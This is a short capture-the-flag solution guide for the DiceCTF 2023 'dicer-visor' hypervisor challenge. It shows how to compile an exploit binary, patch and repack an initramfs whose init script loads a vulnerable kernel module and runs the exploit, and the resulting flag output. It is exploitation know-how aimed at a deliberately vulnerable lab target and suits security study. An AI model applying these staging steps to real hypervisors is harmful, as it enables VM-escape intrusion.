
##### To run the solution

compile `run_shell.c`
```
gcc -static run_shell.c -o run_shell      

```

* unzip `initramfs.cpio.gz`

```
7z x initramfs.cpio.gz
cpio -idv < initramfs.cpio
```

* copy run_shell in the `initramfs` directory
* update the `init` file present in `initramfs` directory to run `run_shell`
```sh
#!/bin/sh

#mount -t proc none /proc
#mount -t sysfs none /sys
#mount -t debugfs none /sys/kernel/debug

echo 1 > /sys/module/rcutree/parameters/rcu_cpu_stall_suppress

/sbin/insmod /vuln.ko
mknod /dev/exploited-device c 32 0

echo "Run shell"
chmod ugo+x /run_shell
exec /run_shell
echo "DONE"
```

* zip the `initramfs` by running the following command in the  `initramfs` directory
```
find . -print0 | cpio --null --create --verbose --format=newc | gzip --best > ../initramfs_patched.cpio.gz
```

* run the binary
```
./dicer-visor bzImage initramfs_patched.cpio.gz
Dicer-visor - DiceGang Security Hypervisor
[*] Created VM
[*] Loaded kernel image: bzImage
[*] Loaded initrd image: initramfs_patched.cpio.gz
[*] Starting up VM

[    0.036000] RETBleed: WARNING: Spectre v2 mitigation leaves CPU vulnerable to RETBleed attacks, data leaks possible!
[    0.364005] [!] Vulnerable Driver Loaded
[    0.368006] [!] driver ioctl issued - cmd: 57005
[    0.380006] [!] driver ioctl issued - cmd: 48879
dice{dicer-visor-rules}
[1]    3790835 segmentation fault (core dumped)  ./dicer-visor bzImage initramfs_patched.cpio.gz
```


##### References: 
* [Pwning a hypervisor - DiceCTF 2023](https://nikoschalk.github.io/posts/dicectf23/dice-visor/)
